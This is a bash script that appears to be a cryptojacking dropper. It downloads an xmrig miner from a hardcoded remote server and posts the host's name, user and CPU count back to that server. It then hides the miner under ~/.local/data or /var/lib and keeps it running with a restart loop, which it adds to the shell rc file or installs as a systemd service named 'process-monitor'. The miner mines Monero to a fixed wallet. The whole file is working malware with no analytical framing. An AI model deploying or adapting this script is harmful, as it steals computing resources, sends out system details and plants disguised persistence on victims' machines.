#!/bin/bash

server='193.36.85.76:9060';
wallet='49omrB4SRef6z3TEPtQec94DVCKLpReK2FocDY2rEgF3buWL4HfvbKFgWEpCcmtNYyeJHiD5PQpcUWSeVGwAXEU8U7eCQqo'
pool1='pool.hashvault.pro:80';
pool2='pool.hashvault.pro:443';
pool3='pool.hashvault.pro:3333';
name1=$(cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 10);
name2=$(cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 10);
name3=$(cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 10);

# so we can write
cd /tmp ;

# Download the miner
curl -O "http://$server/xmrig" || wget "http://$server/xmrig"
cmdline=" -B --cuda --cpu-max-threads-hint 100 -o $pool1 -u $wallet -p $name1 -k  -o $pool2 -u $wallet -p $name2 -k -o $pool3 -u $wallet -p $name3 -k"

# Get User Data
data=$(printf "name1=%s&name2=%s&name3=%s&hostname=%s&user=%s&cpu=%s" "$name1" "$name2" "$name3" "$(hostname)" "$(whoami)" "$(lscpu | grep '^CPU(s):' | awk '{print $2}')" | curl -Gso /dev/null -w %{url_effective} --data-urlencode @- "" | cut -c 3-)
curl "http://$server/getinfo" -X POST -d $data 2>/dev/null


if [ "$(id -u)" != "0" ]; then

echo "Not root installing in home dir";

usershell=$(grep ^$(whoami): /etc/passwd | awk -F : '{print $NF}' | awk -F / '{print $NF}')
shellfile=$HOME"/."$usershell"rc"
mkdir -p $HOME/.local/data/
mv xmrig $HOME/.local/data/;
chmod +x $HOME/.local/data/xmrig;
echo "miner moved";
# Service Script
cat >$HOME/.local/data/maintainer <<EOF
while true
do
    if pgrep "xmrig" > /dev/null
    then
        sleep 60;
    else
        $HOME/.local/data/xmrig $cmdline 2>/dev/null >/dev/null 
    fi
    sleep 600
done
EOF
chmod +x $HOME/.local/data/maintainer;

echo "$($HOME/.local/data/maintainer 2>/dev/null >/dev/null &)" >> $shellfile
echo "miner deployed. Running now"
$HOME/.local/data/maintainer 2>/dev/null >/dev/null &

else


echo "this is root! creating service..."
mv xmrig /var/lib/xmrig;
chmod +x /var/lib/xmrig;
echo "miner moved";

# Service Script
cat >/var/lib/maintainer <<EOF
while true
do
    if pgrep "xmrig" > /dev/null
    then
        sleep 60;
    else
        /var/lib/xmrig $cmdline 2>/dev/null >/dev/null &
    fi
    sleep 600
done
EOF

echo "Service script installed"
chmod +x /var/lib/maintainer;

# Service it self
cat >/etc/systemd/system/process-monitor.service <<EOF
[Unit]
Description=Process monitoring service

[Service]
Type=simple
ExecStart=/bin/bash /var/lib/maintainer
Restart=always

[Install]
WantedBy=multi-user.target
EOF
echo "Service installed"

# start and enable
systemctl daemon-reload;
systemctl start process-monitor;
systemctl enable process-monitor;
echo "Service started......"
fi

